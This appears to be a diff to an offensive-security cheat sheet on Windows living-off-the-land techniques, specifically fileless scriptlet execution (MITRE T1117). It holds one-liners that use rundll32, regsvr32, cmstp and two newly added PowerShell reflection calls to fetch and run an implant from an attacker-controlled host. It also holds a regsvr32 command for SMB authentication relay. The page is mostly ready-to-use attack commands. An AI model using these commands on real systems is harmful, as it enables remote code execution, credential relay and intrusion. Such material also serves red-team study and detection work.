@@ -8,16 +8,20 @@ tags:
   - living-off-the-land
   - T1117
   - windows
+credits:
+  - bohops
 ---
 # Scriptlet
 
-## Rundll32
+## 01 - Command Prompt
+
+### 1.1 - Rundll32
 
 ```
 C:\> rundll32.exe javascript:"\..\mshtml,RunHTMLApplication";o=GetObject("script:http[s]://<attacker_IP>/implant.sct");window.close();
 ```
 
-## Regsvr32
+### 1.2 - Regsvr32
 
 Fileless scriptlet implant template.
 
@@ -62,7 +66,7 @@ Execute command to perform SMB authentication relay.
 C:\> regsvr32.exe /s /u /i:\\<attacker_IP>\@snare scrobj.dll
 ```
 
-## CMSTP
+### 1.3 - CMSTP
 
 Fileless scriptlet implant template
 
@@ -93,6 +97,18 @@ Execute fileless implant.
 
 ```
 C:\> cmstp.exe /ni /s http[s]://<IP>[:PORT]/implant.inf
+```
+
+## 02 - PowerShell
+
+```
+PS C:\> [Reflection.Assembly]::LoadWithPartialName('Microsoft.JScript');[Microsoft.JScript.Eval]::JScriptEvaluate('GetObject("script:http[s]://<attacker_IP>/implant.sct").Exec()',[Microsoft.JScript.Vsa.VsaEngine]::CreateEngine())
+```
+
+Another PowerShell Assembly Reflection SCT Code Execution Example w/ 'Microsoft.VisualBasic.Interaction' -
+
+```
+PS C:\> [Reflection.Assembly]::LoadWithPartialName('Microsoft.VisualBasic');[Microsoft.VisualBasic.Interaction]::GetObject('script:http[s]://<attacker_IP>/implant.sct').Exec(0)
 ```
 
 ---
